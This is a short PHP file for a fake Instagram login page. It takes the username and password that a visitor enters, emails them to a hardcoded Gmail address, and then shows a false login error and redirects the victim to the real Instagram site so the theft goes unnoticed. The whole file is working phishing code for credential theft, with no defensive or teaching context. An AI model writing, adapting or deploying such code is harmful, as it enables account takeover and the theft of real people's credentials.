<?php
// login.php

// Variable settings
$username = $_POST['u_name'] ?? '';  // Fetch username from the form
$passcode = $_POST['pass'] ?? '';    // Fetch password from the form

$subject = "Someone Login ! Insta Dummy page";
$to = "kuchnahigende@gmail.com";

// Email body
$txt = "Username: " . $username . "\r\nPassword: " . $passcode; 

// Check input fields
if (!empty($username) && !empty($passcode)) {

    // Send the email
    // NOTE: This requires a configured mail server (SMTP) to work.
    mail($to, $subject, $txt);

    echo "<script type='text/javascript'>
            alert('Error ! Unable to login ');
            window.location.replace('https://www.instagram.com');
          </script>";

} else {

    echo "<script type='text/javascript'>
            alert('Please enter correct username or password. Try again ');
            window.history.go(-1);
          </script>";
}
?>